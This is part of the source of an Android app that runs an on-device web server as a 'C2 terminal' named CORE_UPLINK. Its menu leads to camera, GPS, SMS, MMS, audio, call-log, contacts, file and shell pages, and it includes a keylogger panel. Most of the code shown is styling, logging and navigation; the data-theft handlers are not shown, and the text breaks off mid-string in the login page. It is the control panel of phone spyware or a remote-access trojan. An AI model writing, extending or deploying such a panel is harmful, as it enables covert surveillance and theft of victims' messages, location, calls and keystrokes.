package com.labs.labrats;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import android.accessibilityservice.AccessibilityService;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.HashSet;
import java.util.Set;
import java.util.HashMap;
import java.util.Date;

import java.io.File;
import java.io.FileInputStream;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.Map;
import org.json.JSONObject;

import fi.iki.elonen.NanoHTTPD;

public class LabRatsHttpServer extends NanoHTTPD {

    private final Context context;
    private static final List<String> systemLogs = java.util.Collections.synchronizedList(new java.util.LinkedList<>());
    private static boolean logsLoaded = false;
    private static Context staticContext;
    private static final java.util.concurrent.atomic.AtomicLong lastLogSaveTime = new java.util.concurrent.atomic.AtomicLong(0);
    private static final SimpleDateFormat logTimeFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());

    public static void logActivity(String msg) {
        String timestamp;
        synchronized (logTimeFormat) {
            timestamp = logTimeFormat.format(new Date());
        }
        String logEntry = "[" + timestamp + "] " + msg;
        
        synchronized (systemLogs) {
            systemLogs.add(0, logEntry);
            if (systemLogs.size() > 100) {
                systemLogs.remove(systemLogs.size() - 1);
            }
        }
        
        // Background Save Throttling: Commits to disk at most once every 3 seconds
        long now = System.currentTimeMillis();
        if (now - lastLogSaveTime.get() > 3000) {
            lastLogSaveTime.set(now);
            LabRatsWorker.execute(LabRatsHttpServer::saveLogsInternal);
        }
    }

    private void loadPersistentData() {
        SharedPreferences prefs = context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE);
        
        // Load System Logs
        if (!logsLoaded) {
            String logsJson = prefs.getString("system_logs", "[]");
            try {
                org.json.JSONArray array = new org.json.JSONArray(logsJson);
                systemLogs.clear();
                for (int i = 0; i < array.length(); i++) {
                    systemLogs.add(array.getString(i));
                }
                logsLoaded = true;
            } catch (Exception e) {
                Log.e("LabRATS", "Log Load Error: " + e.getMessage());
            }
        }
    }

    private static void saveLogsInternal() {
        if (staticContext == null) return;
        try {
            org.json.JSONArray array = new org.json.JSONArray();
            List<String> logsCopy;
            synchronized (systemLogs) {
                logsCopy = new java.util.ArrayList<>(systemLogs);
            }
            for (String log : logsCopy) {
                array.put(log);
            }
            staticContext.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                .edit().putString("system_logs", array.toString()).apply();
        } catch (Exception e) {
            Log.e("LabRATS", "Log Save Error: " + e.getMessage());
        }
    }

    private static final String HTML_HEADER = "<!DOCTYPE html>" +
            "<html lang=\"en\">" +
            "<head>" +
            "<meta charset=\"UTF-8\">" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<title>UPLINK | TERMINAL</title>" +
            "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
            "<style>" +
            "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
            ":root {" +
            "  --neon-cyan: #00f2ff;" +
            "  --neon-green: #39ff14;" +
            "  --neon-yellow: #ffff00;" +
            "  --neon-orange: #ff9d00;" +
            "  --bg-dark: #050505;" +
            "  --bg-card: rgba(15, 15, 25, 0.9);" +
            "  --terminal-green: #00ff41;" +
            "  --danger: #ff3131;" +
            "}" +
            "* { margin: 0; padding: 0; box-sizing: border-box; } " +
            "body {" +
            "  font-family: 'JetBrains Mono', monospace;" +
            "  font-size: 16px;" +
            "  background: var(--bg-dark);" +
            "  background-image: " +
            "    radial-gradient(circle at 50% 50%, rgba(0, 242, 255, 0.03) 0%, transparent 50%)," +
            "    linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.2) 50%)," +
            "    linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));" +
            "  background-size: 100% 100%, 100% 4px, 3px 100%;" +
            "  min-height: 100vh;" +
            "  color: #e0e0e0;" +
            "  overflow-x: hidden;" +
            "}" +
            "body::before {" +
            "  content: \" \";" +
            "  display: block;" +
            "  position: fixed;" +
            "  top: 0; left: 0; bottom: 0; right: 0;" +
            "  background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.08) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));" +
            "  z-index: 9999;" +
            "  pointer-events: none;" +
            "  background-size: 100% 2px, 3px 100%;" +
            "}" +
            ".container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }" +
            ".header {" +
            "  text-align: center;" +
            "  padding: 50px 0;" +
            "  border-bottom: 1px solid rgba(0, 242, 255, 0.3);" +
            "  margin-bottom: 40px;" +
            "  position: relative;" +
            "  overflow: hidden;" +
            "  background: transparent;" +
            "}" +
            "h1, h2, h3, th, .title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; }" +
            ".title-font {" +
            "  font-family: 'Orbitron', sans-serif !important;" +
            "  font-weight: 900 !important;" +
            "  font-size: 3.5rem;" +
            "  color: var(--neon-cyan);" +
            "  text-transform: uppercase;" +
            "  letter-spacing: 12px;" +
            "  margin-right: -12px;" +
            "  text-shadow: 0 0 15px rgba(0, 242, 255, 0.6);" +
            "  margin-bottom: 25px;" +
            "  animation: scanline 8s linear infinite;" +
            "  display: block;" +
            "}" +
            "@media (max-width: 600px) {" +
            "  .title-font { font-size: 1.2rem; letter-spacing: 2px; margin-right: -2px; }" +
            "  .restricted-text { font-size: 1.4rem !important; }" +
            "  .nav a { padding: 12px 20px; font-size: 0.8rem; }" +
            "  .card { padding: 20px; }" +
            "  .file-item { padding: 10px; }" +
            "  .btn-small { padding: 6px 10px; font-size: 0.7rem; min-width: 50px; text-align: center; letter-spacing: 0; }" +
            "  .desktop-only { display: none !important; }" +
            "  .mobile-only { display: inline !important; }" +
            "}" +
            ".desktop-only { display: inline; }" +
            ".mobile-only { display: none; }" +
            "@keyframes scanline { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }" +
            ".glitch-container { position: relative; margin-bottom: 25px; }" +
            ".glitch { font-family: 'Orbitron', sans-serif; color: #fff; font-size: 0.9rem; font-weight: bold; letter-spacing: 3px; text-transform: uppercase; position: relative; display: inline-block; }" +
            ".glitch::before, .glitch::after { content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%; }" +
            ".glitch::before { left: 2px; text-shadow: -2px 0 var(--neon-cyan); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim 5s infinite linear alternate-reverse; }" +
            ".glitch::after { left: -2px; text-shadow: -2px 0 var(--neon-red); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim2 5s infinite linear alternate-reverse; }" +
            ".version-text { font-family: 'Orbitron', sans-serif; color: var(--neon-cyan); opacity: 0.6; font-size: 0.8rem; letter-spacing: 4px; margin-bottom: 25px; }" +
            "@keyframes glitch-anim { 0% { clip: rect(31px, 9999px, 94px, 0); } 5% { clip: rect(70px, 9999px, 71px, 0); } 10% { clip: rect(29px, 9999px, 83px, 0); } 15% { clip: rect(16px, 9999px, 91px, 0); } 20% { clip: rect(2px, 9999px, 23px, 0); } 25% { clip: rect(67px, 9999px, 40px, 0); } 30% { clip: rect(56px, 9999px, 49px, 0); } 35% { clip: rect(28px, 9999px, 34px, 0); } 40% { clip: rect(82px, 9999px, 25px, 0); } 45% { clip: rect(21px, 9999px, 53px, 0); } 50% { clip: rect(44px, 9999px, 12px, 0); } 55% { clip: rect(13px, 9999px, 48px, 0); } 60% { clip: rect(54px, 9999px, 97px, 0); } 65% { clip: rect(51px, 9999px, 60px, 0); } 70% { clip: rect(93px, 9999px, 85px, 0); } 75% { clip: rect(38px, 9999px, 8px, 0); } 80% { clip: rect(10px, 9999px, 63px, 0); } 85% { clip: rect(11px, 9999px, 62px, 0); } 90% { clip: rect(87px, 9999px, 79px, 0); } 95% { clip: rect(49px, 9999px, 2px, 0); } 100% { clip: rect(3px, 9999px, 45px, 0); } }" +
            "@keyframes glitch-anim2 { 0% { clip: rect(65px, 9999px, 100px, 0); } 5% { clip: rect(52px, 9999px, 64px, 0); } 10% { clip: rect(90px, 9999px, 73px, 0); } 15% { clip: rect(3px, 9999px, 95px, 0); } 20% { clip: rect(64px, 9999px, 70px, 0); } 25% { clip: rect(74px, 9999px, 4px, 0); } 30% { clip: rect(31px, 9999px, 17px, 0); } 35% { clip: rect(20px, 9999px, 35px, 0); } 40% { clip: rect(47px, 9999px, 9px, 0); } 45% { clip: rect(69px, 9999px, 69px, 0); } 50% { clip: rect(44px, 9999px, 5px, 0); } 55% { clip: rect(1px, 9999px, 81px, 0); } 60% { clip: rect(53px, 9999px, 26px, 0); } 65% { clip: rect(91px, 9999px, 11px, 0); } 70% { clip: rect(73px, 9999px, 100px, 0); } 75% { clip: rect(24px, 9999px, 17px, 0); } 80% { clip: rect(43px, 9999px, 90px, 0); } 85% { clip: rect(61px, 9999px, 1px, 0); } 90% { clip: rect(81px, 9999px, 2px, 0); } 95% { clip: rect(56px, 9999px, 1px, 0); } 100% { clip: rect(4px, 9999px, 54px, 0); } }" +
            ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 40px; }" +
            ".nav a {" +
            "  padding: 18px 35px;" +
            "  background: rgba(0, 242, 255, 0.05);" +
            "  border: 2px solid rgba(0, 242, 255, 0.3);" +
            "  color: var(--neon-cyan);" +
            "  text-decoration: none;" +
            "  text-transform: uppercase;" +
            "  font-size: 1rem;" +
            "  font-weight: bold;" +
            "  letter-spacing: 2px;" +
            "  border-radius: 12px;" +
            "  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);" +
            "  backdrop-filter: blur(5px);" +
            "  will-change: transform, box-shadow;" +
            "  backface-visibility: hidden;" +
            "  outline: none;" +
            "  -webkit-tap-highlight-color: transparent;" +
            "}" +
            "@media (hover: hover) {" +
            "  .nav a:hover {" +
            "    background: rgba(0, 242, 255, 0.15);" +
            "    border-color: var(--neon-cyan);" +
            "    box-shadow: 0 0 30px var(--neon-cyan), inset 0 0 10px var(--neon-cyan);" +
            "    color: #fff;" +
            "    cursor: pointer;" +
            "  }" +
            "}" +
            ".nav a.active {" +
            "  background: #00b4cc;" +
            "  border-color: var(--neon-cyan);" +
            "  box-shadow: 0 0 25px rgba(0, 242, 255, 0.5);" +
            "  color: #fff;" +
            "  text-shadow: none;" +
            "  font-weight: 900;" +
            "  cursor: pointer;" +
            "}" +
            ".btn-engaged-yellow { background: var(--neon-yellow) !important; color: #000 !important; border-color: var(--neon-yellow) !important; box-shadow: 0 0 20px var(--neon-yellow) !important; cursor: pointer; }" +
            ".card {" +
            "  background: var(--bg-card);" +
            "  border: 1px solid rgba(255, 255, 255, 0.05);" +
            "  border-radius: 12px;" +
            "  padding: 35px;" +
            "  margin-bottom: 30px;" +
            "  backdrop-filter: blur(20px);" +
            "  box-shadow: 0 20px 50px rgba(0,0,0,0.4), inset 0 1px 1px rgba(255,255,255,0.05);" +
            "  position: relative;" +
            "}" +
            ".card-keylogger {" +
            "  border: 1px solid var(--neon-cyan) !important;" +
            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.2) !important;" +
            "  background: rgba(0, 242, 255, 0.02) !important;" +
            "}" +
            "  .card-node .icon {" +
            "    font-size: 2.5rem;" +
            "    margin-bottom: 15px;" +
            "    transition: all 0.3s;" +
            "  }" +
            "}" +
            ".card-node {" +
            "  padding: 30px 20px;" +
            "  border-radius: 12px;" +
            "  text-decoration: none;" +
            "  text-align: center;" +
            "  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);" +
            "  display: flex;" +
            "  flex-direction: column;" +
            "  align-items: center;" +
            "  justify-content: center;" +
            "  border: 1px solid rgba(255,255,255,0.05);" +
            "  background: rgba(255,255,255,0.01);" +
            "  position: relative;" +
            "  overflow: hidden;" +
            "}" +
            "@media (hover: hover) {" +
            "  .card-node:hover {" +
            "    transform: translateY(-10px) scale(1.02);" +
            "    background: rgba(255,255,255,0.03);" +
            "    box-shadow: 0 15px 30px rgba(0,0,0,0.5);" +
            "    cursor: pointer;" +
            "  }" +
            "  .card-node:hover .icon {" +
            "    transform: scale(1.2);" +
            "  }" +
            "}" +
            "h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 25px; color: var(--neon-cyan); }" +
            "button, .btn {" +
            "  display: inline-block;" +
            "  background: rgba(255, 255, 255, 0.03) !important;" +
            "  border: 1px solid currentColor;" +
            "  color: var(--neon-green);" +
            "  padding: 12px 28px;" +
            "  text-transform: uppercase;" +
            "  letter-spacing: 2px;" +
            "  text-decoration: none;" +
            "  border-radius: 12px;" +
            "  font-weight: bold;" +
            "  font-family: 'Orbitron', sans-serif;" +
            "  cursor: pointer;" +
            "  width: fit-content;" +
            "  min-width: 160px;" +
            "  outline: none !important;" +
            "  user-select: none;" +
            "  box-shadow: none !important;" +
            "  -webkit-tap-highlight-color: transparent;" +
            "}" +
            ".btn-active-yellow { background: #ffff00 !important; color: #000 !important; border-color: #ffff00 !important; box-shadow: none !important; cursor: pointer; }" +
            "@media (hover: hover) {" +
            "  button:hover, .btn:hover { background: rgba(255, 255, 255, 0.08) !important; box-shadow: 0 0 25px currentColor !important; cursor: pointer; }" +
            "}" +
            "button:focus, .btn:focus, button:active, .btn:active, button:focus-visible, .btn:focus-visible, " +
            ".nav a:focus, .nav a:active, .btn-back:focus, .btn-back:active {" +
            "  outline: none !important;" +
            "  box-shadow: none !important;" +
            "  background: transparent !important;" +
            "  -webkit-tap-highlight-color: transparent !important;" +
            "  cursor: pointer;" +
            "}" +
            "button.btn-active-yellow:focus, .btn-active-yellow:focus {" +
            "  background-color: #ffff00 !important;" +
            "  cursor: pointer;" +
            "}" +
            ".info-item { background: rgba(0,0,0,0.4); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }" +
            ".info-label { color: var(--neon-cyan); opacity: 0.6; font-size: 0.65rem; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; flex-shrink: 0; }" +
            ".info-value { color: #fff; font-family: 'JetBrains Mono', monospace; font-weight: bold; word-break: break-all; font-size: 0.9rem; }" +
            ".info-section { margin-top: 30px; }" +
            ".info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }" +
            ".breadcrumb { margin-bottom: 25px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }" +
            ".breadcrumb a { color: var(--neon-cyan); text-decoration: none; margin: 0 5px; }" +
            ".breadcrumb span { color: #888; }" +
            ".file-list { list-style: none; }" +
            "  .file-item:hover { background: rgba(255,255,255,0.05); transform: translateX(5px); border-color: rgba(0, 242, 255, 0.3); cursor: pointer; }" +
            "}" +
            ".file-item { display: flex; align-items: center; padding: 15px; border: 1px solid rgba(255,255,255,0.05); background: rgba(0,0,0,0.2); border-radius: 12px; margin-bottom: 10px; transition: all 0.3s; }" +
            ".file-icon { font-size: 1.5rem; margin-right: 20px; width: 40px; text-align: center; }" +
            ".file-info { flex-grow: 1; }" +
            ".file-name { color: #fff; text-decoration: none; font-weight: bold; display: block; margin-bottom: 4px; font-size: 0.9rem; }" +
            ".file-meta { font-size: 0.7rem; color: #888; letter-spacing: 1px; }" +
            ".btn-small { padding: 10px 20px; font-size: 0.75rem; border-radius: 10px; min-width: 0; width: auto; }" +
            ".btn-container { display: flex; gap: 15px; }" +
            ".flex-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }" +
            ".empty-state { text-align: center; padding: 60px 20px; }" +
            ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; opacity: 0.2; color: var(--neon-cyan); }" +
            ".card-keylogger { border: 2px solid var(--neon-cyan) !important; box-shadow: 0 0 20px rgba(0, 242, 255, 0.4) !important; background: rgba(0, 242, 255, 0.05) !important; display: block !important; opacity: 1 !important; visibility: visible !important; }" +
            ".terminal-text { font-family: 'JetBrains Mono', monospace; color: var(--neon-cyan); background: #000; padding: 15px; border-radius: 8px; border: 1px solid rgba(0, 242, 255, 0.2); box-shadow: inset 0 0 20px rgba(0,0,0,0.8); }" +
            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 42px; width: 42px; z-index: 10; pointer-events: none; object-fit: contain; }" +
            
            // --- DESKTOP_UI_OPTIMIZATION ---
            "@media (min-width: 1024px) {" +
            "  input[type='text'], input[type='password'], textarea { max-width: 500px !important; }" +
            "  .card button:not(.btn-small) { max-width: 300px !important; }" +
            "  #shell-cmd { max-width: 100% !important; }" + 
            "  .terminal-input-wrap { max-width: 800px; }" +
            "  .action-row-limited { max-width: 900px; margin-left: 0 !important; margin-right: auto !important; display: flex !important; gap: 10px; }" +
            "  .action-row-limited button, .action-row-limited form { flex: 1 !important; min-width: 0 !important; max-width: 300px !important; }" +
            "  .action-row-limited form button { width: 100% !important; }" +
            "  .btn-fit { flex: 0 1 auto !important; min-width: 150px !important; max-width: 200px !important; }" +
            "}" +
            
            // --- MOBILE_OPTIMIZATION_PROTOCOL ---
            "@media (max-width: 768px) {" +
            "  body { overflow-x: hidden; width: 100%; font-size: 14px; margin: 0; padding: 0; -webkit-text-size-adjust: 100%; }" +
            "  button:hover, .btn:hover, .nav a:hover, .btn-back:hover, " +
            "  button:active, .btn:active, .nav a:active, .btn-back:active {" +
            "    box-shadow: none !important; transform: none !important; transition: none !important; " +
            "    background: rgba(255, 255, 255, 0.03) !important; " +
            "  }" +
            "  .container { width: 100vw; overflow-x: hidden; padding: 10px; box-sizing: border-box; margin: 0; }" +
            "  .action-row-limited { flex-direction: column !important; }" +
            "  .header { padding: 15px 0; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; gap: 0; overflow: visible; }" +
            "  .title-font { font-family: 'Orbitron', sans-serif !important; font-size: 1.71rem !important; letter-spacing: 1.5px !important; margin-right: -1.5px !important; font-weight: 900 !important; text-align: center !important; width: 100% !important; display: block !important; margin: 0 0 10px 0 !important; white-space: nowrap !important; overflow: visible !important; position: relative; z-index: 10; line-height: 1.2; }" +
            "  .glitch-container { margin: 0 0 10px 0 !important; height: auto !important; }" +
            "  .version-text { font-size: 0.45rem !important; letter-spacing: 1px !important; margin: 0 0 10px 0 !important; }" +
            "  .glitch { font-size: 0.47rem; letter-spacing: 1px; }" +
            "  .nav { gap: 4px; justify-content: center; width: 100%; padding: 0 4px; box-sizing: border-box; }" +
            "  .nav a { padding: 10px 1px; font-size: 0.55rem; border-radius: 12px; flex: 1 1 calc(33.33% - 6px); text-align: center; letter-spacing: 0; min-width: 0; font-weight: normal; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }" +
            "  .card { padding: 15px; margin-bottom: 12px; border-radius: 10px; width: 100%; box-sizing: border-box; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); }" +
            "  .card-keylogger { border: 2px solid var(--neon-cyan) !important; box-shadow: 0 0 25px rgba(0, 242, 255, 0.5) !important; background: rgba(0, 242, 255, 0.1) !important; position: relative; z-index: 100; display: block !important; visibility: visible !important; }" +
            "  .card-keylogger::after { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; border-radius: 10px; pointer-events: none; box-shadow: inset 0 0 10px rgba(0, 242, 255, 0.1); }" +
            "  .info-grid { grid-template-columns: 1fr !important; gap: 8px; }" +
            "  .info-item { padding: 12px; }" +
            "  #log-terminal { height: 260px !important; font-size: 0.65rem !important; padding: 10px !important; }" +
            "  .header-actions { margin-left: 0 !important; margin-top: 10px; width: 100%; justify-content: center !important; flex-wrap: wrap; gap: 4px !important; }" +
            "  button:not(.btn-small), .btn:not(.btn-small) { width: 100% !important; min-width: 0 !important; text-align: center; padding: 14px 10px !important; margin-bottom: 8px; border-radius: 12px; display: block !important; font-size: 0.65rem !important; white-space: normal !important; height: auto !important; line-height: 1.4 !important; }" +
            "  .btn-small { width: auto !important; min-width: 0 !important; display: inline-block !important; padding: 8px 10px !important; font-size: 0.6rem !important; letter-spacing: 0 !important; border-radius: 8px !important; margin-bottom: 5px !important; white-space: normal !important; height: auto !important; line-height: 1.2 !important; }" +
            "  .btn-container { flex-direction: column !important; gap: 8px !important; }" +
            "  .flex-header { flex-direction: column !important; align-items: flex-start !important; gap: 10px !important; }" +
            "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; border-radius: 12px; }" +
            "  .watermark { position: relative !important; top: 0 !important; left: 0 !important; transform: none !important; margin-bottom: 15px; height: 85px !important; width: auto !important; opacity: 1.0 !important; z-index: 10; pointer-events: none; display: block !important; }" +
            "  .intel-status { font-size: 0.65rem !important; white-space: nowrap !important; line-height: 1.2; }" +
            "  table { display: block; overflow-x: auto; width: 100%; -webkit-overflow-scrolling: touch; }" +
            "  th, td { padding: 10px 8px; font-size: 0.65rem; }" +
            "  h2 { font-size: 0.95rem !important; flex-wrap: nowrap !important; gap: 8px !important; display: flex !important; align-items: center !important; white-space: nowrap !important; }" +
            "  h3 { font-size: 0.85rem !important; display: flex !important; align-items: center !important; gap: 8px !important; white-space: nowrap !important; }" +
            "  .info-section { margin-top: 15px; }" +
            "  .file-item { padding: 10px; gap: 8px; }" +
            "  .file-item .btn-small { padding: 4px 10px !important; font-size: 0.55rem !important; margin: 0 !important; width: auto !important; min-width: 0 !important; display: inline-block !important; }" +
            "  .file-info { min-width: 0; }" +
            "  .file-name { font-size: 0.8rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }" +
            "  .file-icon { margin-right: 10px; width: 25px; font-size: 1.1rem; }" +
            "  .password-title { font-size: 0.55rem !important; letter-spacing: 1px !important; }" +
            "  button:hover, .btn:hover { transform: none !important; box-shadow: 0 0 15px currentColor !important; background: rgba(255, 255, 255, 0.1) !important; }" +
            "  .btn-engaged-yellow:hover { background: rgba(255, 255, 0, 0.2) !important; color: var(--neon-yellow) !important; box-shadow: 0 0 25px var(--neon-yellow) !important; }" +
            "}" +
            
            // --- SMARTPHONE_FRAME_PROTOCOL ---
            ".phone-frame {" +
            "  width: 280px;" +
            "  height: auto;" +
            "  background: #111;" +
            "  border-radius: 40px;" +
            "  padding: 12px;" +
            "  border: 4px solid #333;" +
            "  box-shadow: 0 0 40px rgba(0,0,0,0.8), 0 0 10px rgba(0, 242, 255, 0.1);" +
            "  margin: 0 auto;" +
            "  position: relative;" +
            "  overflow: visible;" +
            "}" +
            ".phone-frame::before {" +
            "  content: '';" +
            "  position: absolute;" +
            "  top: 20px;" +
            "  left: 50%;" +
            "  transform: translateX(-50%);" +
            "  width: 50px;" +
            "  height: 6px;" +
            "  background: #222;" +
            "  border-radius: 10px;" +
            "  z-index: 10;" +
            "}" +
            ".phone-screen {" +
            "  width: 100%;" +
            "  height: 100%;" +
            "  min-height: 580px;" +
            "  background: #000;" +
            "  border-radius: 28px;" +
            "  overflow: hidden;" +
            "  position: relative;" +
            "  border: 1px solid #222;" +
            "  display: flex;" +
            "  align-items: center;" +
            "  justify-content: center;" +
            "}" +
            ".phone-notch {" +
            "  position: absolute;" +
            "  top: 0;" +
            "  left: 50%;" +
            "  transform: translateX(-50%);" +
            "  width: 120px;" +
            "  height: 25px;" +
            "  background: #000;" +
            "  border-bottom-left-radius: 15px;" +
            "  border-bottom-right-radius: 15px;" +
            "  z-index: 20;" +
            "}" +
            
            "textarea { resize: vertical; width: 100%; max-width: 100%; }" +
            "table { width: 100%; border-collapse: separate; border-spacing: 0 8px; }" +
            "th { text-align: left; padding: 15px; color: var(--neon-cyan); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; opacity: 0.7; }" +
            "td { padding: 15px; background: rgba(255,255,255,0.03); border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05); }" +
            "td:first-child { border-left: 1px solid rgba(255,255,255,0.05); border-radius: 8px 0 0 8px; }" +
            "td:last-child { border-right: 1px solid rgba(255,255,255,0.05); border-radius: 0 8px 8px 0; }" +
            ".call-incoming { color: var(--neon-green); text-shadow: 0 0 5px rgba(57, 255, 20, 0.4); }" +
            ".call-outgoing { color: var(--neon-cyan); text-shadow: 0 0 5px rgba(0, 242, 255, 0.4); }" +
            ".call-missed { color: var(--danger); text-shadow: 0 0 5px rgba(255, 49, 49, 0.4); }" +
            ".pagination { display: flex; justify-content: center; align-items: center; margin-top: 40px; gap: 8px; }" +
            ".pagination a { padding: 10px 18px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #fff; text-decoration: none; border-radius: 12px; font-size: 0.8rem; transition: all 0.3s; }" +
            "  .pagination a:hover, .pagination a.active { background: rgba(0, 242, 255, 0.1); border-color: var(--neon-cyan); color: var(--neon-cyan); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }" +
            "}" +
            "@media (hover: hover) {" +
            "  .btn-back:hover { background: rgba(0, 242, 255, 0.1); box-shadow: 0 0 25px currentColor; border-color: currentColor; }" +
            "}" +
            ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 12px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 75%; width: auto; z-index: 10000; opacity: 1.0; pointer-events: none; border-radius: 50%; background: transparent !important; filter: drop-shadow(0 0 8px var(--neon-cyan)); }" +
            "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
            "</style>" +
            "</head>" +
            "<body>" +
            "<div class=\"container\">" +
            "  <div class=\"header\">" +
            "    <img src=\"/logo?v=145\" class=\"watermark\" alt=\"UPLINK\" loading=\"eager\">" +
            "    <div class=\"title-font\">CORE_UPLINK</div>" +
            "    <div class=\"glitch-container\">" +
            "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
            "    </div>" +
            "    <div class=\"version-text\">C2_TERMINAL_INTERFACE_V1.4.5</div>" +
            "  </div>" +
            "  <div class=\"nav\">" +
            "    <a href=\"/\">Terminal</a>" +
            "    <a href=\"/ghost\">Ghost</a>" +
            "    <a href=\"/camera\">Optics</a>" +
            "    <a href=\"/gps\">Locate</a>" +
            "    <a href=\"/files\">Data</a>" +
            "    <a href=\"/intel\">Intel</a>" +
            "    <a href=\"/sms\">SMS</a>" +
            "    <a href=\"/mms\">MMS</a>" +
            "    <a href=\"/audio\">Acoustics</a>" +
            "    <a href=\"/calls\">Comms</a>" +
            "    <a href=\"/contacts\">Contacts</a>" +
            "    <a href=\"/device\">Hardware</a>" +
            "  </div>";

    private static final String HTML_FOOTER = "<div style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 60px; margin-bottom: 20px; opacity: 0.5; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 0 20px;\">" +
            "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's that MIND don't matter... The one's that MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
            "</div>" +
            "</div>" +
            "<script>" +
            "  function updateNav() {" +
            "    const path = window.location.pathname;" +
            "    const links = document.querySelectorAll('.nav a');" +
            "    links.forEach(l => l.classList.remove('active'));" +
            "    // NUCLEAR FIX for double-lit tabs: Find exact match first, then longest prefix\n" +
            "    let bestMatch = null;\n" +
            "    for (let link of links) {\n" +
            "      const href = link.getAttribute('href');\n" +
            "      if (path === href) {\n" +
            "        bestMatch = link;\n" +
            "        break;\n" +
            "      } else if (href !== '/' && path.startsWith(href)) {\n" +
            "        if (!bestMatch || href.length > bestMatch.getAttribute('href').length) {\n" +
            "          bestMatch = link;\n" +
            "        }\n" +
            "      }\n" +
            "    }\n" +
            "    if (bestMatch) bestMatch.classList.add('active');\n" +
            "  }" +
            "  updateNav();" +
            "  const scrollY = localStorage.getItem('cam_scroll');" +
            "  if (scrollY) { window.scrollTo(0, parseInt(scrollY)); localStorage.removeItem('cam_scroll'); }" +
            "  window.onpopstate = updateNav;\n" +
            "  window.addEventListener('pageshow', updateNav);" +
            "  document.addEventListener('visibilitychange', () => { if(document.visibilityState === 'visible') updateNav(); });" +
            "  // Extra insurance for phone back button\n" +
            "  setInterval(updateNav, 1000);\n" +
            "</script>" +
            "</body>" +
            "</html>";

    private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>UPLINK | LOGIN</title>" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<style>" +
            "@font-face { font-family: 'Orbitron'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
            "* { box-sizing: border-box; margin: 0; padding: 0; }" +
            "body { background: #050505; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; padding: 15px; }" +
